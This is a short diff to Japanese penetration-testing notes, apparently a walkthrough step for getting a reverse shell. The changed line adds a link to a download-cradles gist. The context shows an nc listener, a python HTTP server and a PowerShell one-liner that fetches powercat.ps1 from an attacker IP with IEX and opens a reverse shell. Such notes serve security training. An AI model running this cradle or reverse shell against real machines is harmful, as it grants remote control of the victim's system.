@@ -170,8 +170,7 @@ sudo python -m http.server 80
 sudo rlwrap nc -lvnp 4444
 ```
 
-3. 🔗[PowerCat](https://github.com/besimorhino/powercat)を攻撃者マシンからダウンロードさせ、PowerCatを実行してリバースシェルを獲得するコマンドを用意
-	
+3. 🔗[PowerCat](https://github.com/besimorhino/powercat)を攻撃者マシンからダウンロードさせ、PowerCatを実行してリバースシェルを獲得するコマンドを用意（🔗[DownloadCradles.ps1 - Github](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)）
 ```powershell
 IEX (New-Object Net.Webclient).downloadstring('http://[AttackerIP]/powercat.ps1');powercat -c [AttackerIP] -p [Listener Port] -e powershell
 ```
